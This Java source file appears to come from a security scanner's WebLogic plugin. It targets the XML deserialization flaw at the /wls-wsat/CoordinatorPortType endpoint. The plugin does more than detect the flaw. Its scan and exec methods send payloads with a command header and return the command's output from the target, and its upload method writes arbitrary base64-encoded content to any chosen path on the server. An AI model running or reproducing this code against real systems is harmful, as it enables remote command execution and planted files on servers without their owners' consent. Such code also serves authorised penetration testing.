package com.gbw.scanner.plugins.scripts.weblogic.vuls;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpPostRequestBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.plugins.scripts.weblogic.GBWScanWeblogicConfig;
import com.gbw.scanner.plugins.scripts.weblogic.GBWWeblogicVersion;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWXmlEchoPayload;
import com.gbw.scanner.utils.HttpUtils;
import com.xmap.api.utils.TextUtils;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import sun.misc.BASE64Encoder;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public abstract class GBWXmlDeserailVul implements GBWEchoVul {

    private static final Logger log = LoggerFactory.getLogger(GBWXmlDeserailVul.class);

    protected GBWScanWeblogicConfig config;
    protected List<GBWXmlEchoPayload> payloads;
    protected String type;
    protected String code;

    public GBWXmlDeserailVul(GBWScanWeblogicConfig config,String type,String code){

        this.config = config;
        this.type = type;
        this.code = code;
        this.payloads = new ArrayList<>();
    }

    private String getProto(Host host){

        String proto = host.getProto();

        if(TextUtils.isEmpty(proto)||proto.equals("t3")||proto.equals("iiop"))
            proto = "http";
        else if(proto.equals("t3s"))
            proto = "https";

        return proto;
    }

    private HttpPost makeRequest(Host host,Map<String,String> headers,String content) throws Exception {

        return new GBWHttpPostRequestBuilder(getProto(host),host.getIp(),host.getPort(),"/wls-wsat/CoordinatorPortType")
                .addHeaders(headers)
                .postString(content,false)
                .setTimeout(config.getConTimeout(),config.getReadTimeout())
                .build();
    }

    public GBWVulCheckResult scan(Host host) {


        CloseableHttpClient httpClient = null;
        HttpPost httpPost = null;
        GBWHttpResponse httpResponse = null;

        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-type", "text/xml");
        headers.put("type", "exec");
        headers.put("cmd", config.getCmd());

        String version = GBWWeblogicVersion.getVersion(config,host);
        if(TextUtils.isEmpty(version))
            return null;

        try {

            httpClient = GBWHttpClientBuilder.make(getProto(host),host.getPort());

            for(GBWXmlEchoPayload payload:payloads){
                log.info(String.format("For weblogic version:%s,check payload:%s",version,payload.getName()));
                httpPost = makeRequest(host,headers,payload.getXml());

                httpResponse = HttpUtils.sendWithHeaders(httpClient,httpPost,true);

                if(httpResponse!=null&&httpResponse.getHeaderMap()!=null){

                    String isVul = httpResponse.getHeaderMap().get("isVul");
                    if(!TextUtils.isEmpty(isVul)){

                        String result = httpResponse.getContent();
                        log.warn(String.format("Find a weblogic vul,version:%s,check payload:%s,type:%s,code:%s,cmd:%s,result:%s,url:%s//%s:%d",
                                version,
                                payload.getName(),
                                type,
                                code,
                                config.getCmd(),
                                result,
                                host.getProto(),
                                host.getIp(),
                                host.getPort()));

                        return new GBWVulCheckResult(version,
                                code,type,config.getCmd(),
                                result,
                                payload.getName());

                    }
                }
            }
        }catch (Exception e){


        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return null;
    }

    private GBWXmlEchoPayload findPayload(String pname){

        for (GBWXmlEchoPayload payload:payloads){

            if(payload.getName().equals(pname))
                return payload;
        }
        return null;
    }

    @Override
    public String exec(Host host,String pname,String cmd) {

        CloseableHttpClient httpClient = null;
        HttpPost httpPost = null;
        GBWHttpResponse httpResponse = null;
        GBWXmlEchoPayload payload = findPayload(pname);
        if(payload == null)
            return null;

        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-type", "text/xml");
        headers.put("type", "exec");
        headers.put("cmd", cmd);

        try {
            httpClient = GBWHttpClientBuilder.make(getProto(host),host.getPort());
            httpPost = makeRequest(host,headers,payload.getXml());

            httpResponse = HttpUtils.sendWithHeaders(httpClient,httpPost,true);

            if(httpResponse!=null&&httpResponse.getHeaderMap()!=null){

                String isVul = httpResponse.getHeaderMap().get("isVul");
                if(!TextUtils.isEmpty(isVul))
                    return httpResponse.getContent();
            }
        }catch (Exception e){

        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return null;

    }

    @Override
    public void upload(Host host,String pname,String path, String text) {

        CloseableHttpClient httpClient = null;
        HttpPost httpPost = null;
        GBWHttpResponse httpResponse = null;
        GBWXmlEchoPayload payload = findPayload(pname);
        if(payload == null)
            return;

        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-type", "text/xml");
        headers.put("type", "upload");
        headers.put("path", path);
        String s=null;
        try {
            s=URLEncoder.encode(new BASE64Encoder().encode(text.getBytes()),"utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        headers.put("text", s);

        try {
            httpClient = GBWHttpClientBuilder.make(getProto(host),host.getPort());
            httpPost = makeRequest(host,headers,payload.getXml());
            HttpUtils.send(httpClient,httpPost,true);
        }catch (Exception e){

        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void remove(Host host,String pname) {

    }
}
